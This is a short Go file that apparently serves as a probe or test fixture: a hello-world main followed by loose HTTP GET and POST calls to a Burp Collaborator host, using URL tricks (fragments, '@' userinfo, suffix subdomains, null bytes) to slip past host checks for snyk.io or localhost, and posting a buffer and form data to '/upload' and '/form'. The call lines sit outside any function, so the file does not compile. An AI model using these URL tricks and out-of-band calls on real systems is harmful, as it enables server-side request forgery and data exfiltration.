package main

import "fmt"

import "rsc.io/quote"

func main() {
    fmt.Println(quote.Go())
}

resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/vanilla")
resp, err := http.Get("snyk.io#fragment.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
resp, err := http.Get("snyk.io@mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/creds")
resp, err := http.Get("snyk.io.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net%00snyk.io")

resp, err := http.Get("localhost#fragment.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
resp, err := http.Get("localhost@mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/creds")
resp, err := http.Get("localhost.mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net")
resp, err := http.Get("mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net%00localhost")

resp, err := http.Post("http://mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/upload", "image/jpeg", &buf)
resp, err := http.PostForm("http://mh7oavm9vc0z0q0ammmq38igo7uxim.burpcollaborator.net/form",
	url.Values{"key": {"Value"}, "id": {"123"}})
